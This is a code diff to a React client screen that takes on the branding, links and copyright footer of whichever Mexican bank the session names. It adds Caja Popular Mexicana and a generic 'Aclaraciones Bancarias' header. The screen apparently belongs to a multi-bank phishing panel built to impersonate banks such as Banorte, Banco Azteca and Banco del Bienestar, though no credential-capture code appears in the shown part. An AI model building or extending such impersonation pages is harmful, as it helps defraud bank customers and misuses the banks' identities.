@@ -404,14 +404,10 @@ export default function ClientScreen() {
         </header>
       );
     } else {
-      // Default header (Banorte)
+      // Default header genérico 
       return (
-        <header className="bg-[#EC1C24] text-white p-4 text-center">
-          <img 
-            src={banorteLogoHeader} 
-            className="banorte-logo inline-block mb-2" 
-            alt="Banorte" 
-          />
+        <header className="bg-gray-500 text-white p-4 text-center">
+          <div className="font-bold text-lg">Aclaraciones Bancarias</div>
           <div className="font-bold text-sm">{formatDate(new Date())}</div>
         </header>
       );
@@ -456,6 +452,7 @@ export default function ClientScreen() {
               sessionData.banco === 'PLATACARD' ? 'https://www.platacard.com/' :
               sessionData.banco === 'BANCO_AZTECA' ? 'https://www.bancoazteca.com.mx/' :
               sessionData.banco === 'BIENESTAR' ? 'https://www.gob.mx/bancodelbienestar' :
+              sessionData.banco === 'CAJAPOPULAR' ? 'https://www.cajapopularmexicana.mx/' :
               'https://www.banorte.com/'
             } target="_blank" rel="noopener noreferrer" className={`${
               sessionData.banco === 'LIVERPOOL' ? 'text-[#E1147B]' : 
@@ -484,6 +481,7 @@ export default function ClientScreen() {
               sessionData.banco === 'INVEX' ? 'https://www.invex.com/contacto' :
               sessionData.banco === 'BANREGIO' ? 'https://www.banregio.com/ayuda/' :
               sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/centro-de-ayuda' :
+              sessionData.banco === 'CAJAPOPULAR' ? 'https://www.cajapopularmexicana.mx/contacto' :
               'https://www.banorte.com/wps/portal/banorte/Home/ayuda-banorte/'
             } target="_blank" rel="noopener noreferrer" className={`${
               sessionData.banco === 'LIVERPOOL' ? 'text-[#E1147B]' :
@@ -511,6 +509,7 @@ export default function ClientScreen() {
               sessionData.banco === 'INVEX' ? 'https://www.invex.com/aviso-de-privacidad' :
               sessionData.banco === 'BANREGIO' ? 'https://www.banregio.com/contenido/terminos.php' :
               sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/aviso-de-privacidad' :
+              sessionData.banco === 'CAJAPOPULAR' ? 'https://www.cajapopularmexicana.mx/terminos' :
               'https://www.banorte.com/wps/portal/banorte/Home/inicio/terminos-y-condiciones'
             } target="_blank" rel="noopener noreferrer" className={`${
               sessionData.banco === 'LIVERPOOL' ? 'text-[#E1147B]' :
@@ -538,6 +537,7 @@ export default function ClientScreen() {
               sessionData.banco === 'INVEX' ? 'https://www.invex.com/seguridad' :
               sessionData.banco === 'BANREGIO' ? 'https://www.banregio.com/seguridad.php' :
               sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/seguridad' :
+              sessionData.banco === 'CAJAPOPULAR' ? 'https://www.cajapopularmexicana.mx/seguridad' :
               'https://www.banorte.com/wps/portal/banorte/Home/seguridad-banorte'
             } target="_blank" rel="noopener noreferrer" className={`${
               sessionData.banco === 'LIVERPOOL' ? 'text-[#E1147B]' :
@@ -669,6 +669,7 @@ export default function ClientScreen() {
               sessionData.banco === 'PLATACARD' ? 'Plata Card' :
               sessionData.banco === 'BANCO_AZTECA' ? 'Banco Azteca' :
               sessionData.banco === 'BIENESTAR' ? 'Banco del Bienestar' :
+              sessionData.banco === 'CAJAPOPULAR' ? 'Caja Popular Mexicana' :
               'Banorte'
             } México 2024. Todos los Derechos Reservados</div>
           </div>
